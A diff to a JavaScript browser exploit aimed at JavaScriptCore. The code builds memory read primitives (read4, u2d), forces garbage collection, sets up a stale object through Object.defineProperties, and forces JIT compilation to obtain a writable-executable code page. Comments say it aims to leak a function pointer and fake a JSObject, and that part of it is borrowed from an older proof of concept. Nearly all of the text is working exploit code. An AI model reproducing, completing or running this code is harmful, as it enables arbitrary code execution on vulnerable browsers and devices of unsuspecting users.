@@ -6,14 +6,15 @@
  var mem2 = 0;
  var pressure = new Array(100);
  var bufs = new Array(100);
- var print = alert;
- _dview = null;
+ var stale = 0;
+
 
  var trycatch = "";
  for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
  var fc = new Function(trycatch);
  var fcp = 0;
  var smsh = new Uint32Array(0x10)
+ 
 
  function read4(addr) {
  	mem0[4] = addr;
@@ -29,8 +30,9 @@
  }
 
 
- // This code seems to be taken from a PoC for PSA-2013-0903.
+ // This u2d code seems to be taken from a PoC for PSA-2013-0903.
  // wraps two uint32s into double precision
+ _dview = null;
  function u2d(low, hi) {
  	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
  	_dview.setUint32(0, hi);
@@ -48,17 +50,26 @@ function dgc() {
  	}
  }
 
+// I dont know why hes doing this.
+for (var i = 0; i < 0x1000; i++){
+	var a = new Uint32Array(1);
+	a[i.toString(16)] = 1337;
+}
+
 
  function allocbufptrs() {
  	if (bufs[0]) return;
- 	dgc();
- 	dgc();
- 	dgc();
- 	dgc();
- 	dgc();
- 	dgc();
- 	dgc();
- 	dgc();
+	dgc();
+        dgc();
+        dgc();
+        dgc();
+        dgc();
+        dgc();
+        dgc();
+        dgc();
+        dgc();
+        dgc();
+        dgc();
 	 
 	// Create 0x200 FFFF:0000:4141:4141 integer objects
  	for (i = 0; i < bufs.length; i++) {
@@ -170,7 +181,6 @@ function dgc() {
  		after: {value: 666}
  	};
  	var target = [];
- 	var stale = 0;
  	var before_len = arr.length;
  	Object.defineProperties(target, props);
  	stale = target.stale;
@@ -184,7 +194,6 @@ function dgc() {
 	}
 	 
 	stale[0] += 0x101;
- 	stale[1] = {}
 	 
 	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
 	// This will force JS to create a r/w/x block of memory, with raw machine code,
@@ -204,9 +213,11 @@ function dgc() {
  				//fcp = bufs[i][k];
 				//alert("Leaked function pointer:" + fcp)
 				
-                       		bufs.push(stale);
+                       		
 				alert("Pushed stale");
-				
+				bufs.push(stale);
+				stale[0] = fc;
+                        	fcp = bufs[i][k];
 				structID = 100;
 				stale[0] = {
 				    'a': u2d(structID, 0), // the JSObject properties
